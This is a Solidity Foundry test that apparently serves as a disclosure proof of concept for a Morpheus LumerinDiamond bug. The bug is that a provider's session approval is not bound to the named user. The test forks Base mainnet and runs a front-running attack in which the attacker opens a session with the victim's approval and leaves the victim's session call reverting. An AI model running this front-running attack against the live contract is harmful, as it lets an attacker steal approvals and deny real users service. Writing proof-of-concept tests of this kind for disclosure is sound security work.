// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

/**
 * @title Morpheus LumerinDiamond — provider session approval is not bound to the user
 * @notice PoC for the finding: SessionRouter._extractProviderApproval decodes the
 *  (bidId, chainId, user, timestamp) approval but NEVER checks the embedded user
 *  address against openSession's user_ parameter. The ISessionRouter error
 *  SessionApprovedForAnotherUser exists but is never thrown (the check was removed
 *  in Morpheus-Lumerin-Node commit 605cfcc, Nov 2024, when provider-delegator
 *  approvals were added).
 *
 *  Attack: anyone who observes a victim's provider approval (e.g. in the mempool,
 *  where the victim's openSession tx is public) can front-run it, open a session
 *  for THEMSELVES against the provider's bid, and burn the one-time approval.
 *  The victim's openSession then reverts with SessionDuplicateApproval.
 *
 *  Run: BASE_RPC_URL=<base rpc> forge test --match-contract SessionApprovalNotBoundToUser -vvv
 *  (defaults to https://mainnet.base.org if BASE_RPC_URL is unset)
 */
contract SessionApprovalNotBoundToUser is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant FORK_BLOCK = 58549310;
    uint256 constant BASE_CHAIN_ID = 8453;

    error SessionDuplicateApproval();

    struct Session {
        address user;
        bytes32 bidId;
        uint256 stake;
        bytes closeoutReceipt;
        uint256 closeoutType;
        uint256 providerWithdrawnAmount;
        uint128 openedAt;
        uint128 endsAt;
        uint128 closedAt;
        bool isActive;
        bool isDirectPaymentFromUser;
    }

    IDiamond constant diamond = IDiamond(DIAMOND);

    uint256 providerKey = 0x1111111111111111111111111111111111111111111111111111111111111111;
    address provider;
    address victim = address(0x1000000000000000000000000000000000000001);
    address attacker = address(0x1000000000000000000000000000000000000002);

    bytes32 modelId;
    bytes32 bidId;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org")), FORK_BLOCK);
        provider = vm.addr(providerKey);

        // Fund everybody with MOR and approve the diamond.
        deal(MOR, provider, 10 ether);
        deal(MOR, victim, 10 ether);
        deal(MOR, attacker, 10 ether);

        vm.prank(provider);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(victim);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(attacker);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);

        // Provider registers (min stake 0.2 MOR) and registers a model (min stake 0.1 MOR).
        vm.prank(provider);
        diamond.providerRegister(provider, 0.2 ether, "https://provider.example");
        bytes32 baseModelId = keccak256("test-model");
        vm.prank(provider);
        diamond.modelRegister(provider, baseModelId, bytes32(uint256(1)), 0, 0.1 ether, "test-model", new string[](0));
        modelId = diamond.getModelId(provider, baseModelId);

        // Provider posts a bid at the minimum price (1e10 wei/sec). Bid fee 0.3 MOR.
        vm.prank(provider);
        bidId = diamond.postModelBid(provider, modelId, 1e10);
        assertEq(bidId, diamond.getBidId(provider, modelId, 0), "bid id mismatch");
    }

    function testApprovalCanBeStolenByAnotherUser() public {
        // Provider issues an approval INTENDED FOR THE VICTIM ONLY:
        // approval = abi.encode(bidId, chainId, user=victim, timestamp)
        bytes memory approval = abi.encode(bidId, BASE_CHAIN_ID, victim, uint128(block.timestamp));
        bytes memory signature = _signApproval(approval);

        // Sanity: the approval really names the victim.
        (, , address namedUser, ) = abi.decode(approval, (bytes32, uint256, address, uint128));
        assertEq(namedUser, victim, "approval must name the victim");

        // ATTACKER front-runs the victim and opens a session for THEMSELVES
        // with the victim's approval. This MUST revert if the approval were
        // bound to the user — but it succeeds.
        vm.prank(attacker);
        bytes32 sessionId = diamond.openSession(attacker, 1 ether, false, approval, signature);

        // The session exists and belongs to the attacker, not the victim.
        Session memory s = diamond.getSession(sessionId);
        assertEq(s.user, attacker, "session should belong to attacker (bug)");
        assertTrue(s.isActive, "attacker session must be active");
        assertEq(s.bidId, bidId, "session must reference the provider bid");

        // VICTIM now tries to use their own approval — it was already burned.
        vm.prank(victim);
        vm.expectRevert(SessionDuplicateApproval.selector);
        diamond.openSession(victim, 1 ether, false, approval, signature);

        // Victim ends up with no session at all.
        (, uint256 victimSessionCount) = diamond.getUserSessions(victim, 0, 10);
        assertEq(victimSessionCount, 0, "victim must have no sessions");
    }

    function _signApproval(bytes memory approval) internal view returns (bytes memory) {
        bytes32 digest = keccak256(approval);
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(providerKey, ethHash);
        return abi.encodePacked(r, s, v);
    }
}

interface IDiamond {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] memory tags_
    ) external;
    function postModelBid(
        address provider_,
        bytes32 modelId_,
        uint256 pricePerSecond_
    ) external returns (bytes32 bidId);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function getSession(
        bytes32 sessionId_
    ) external view returns (SessionApprovalNotBoundToUser.Session memory);
    function getUserSessions(
        address user_,
        uint256 offset_,
        uint256 limit_
    ) external view returns (bytes32[] memory, uint256);
    function getBidId(address provider_, bytes32 modelId_, uint256 nonce_) external pure returns (bytes32);
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
}
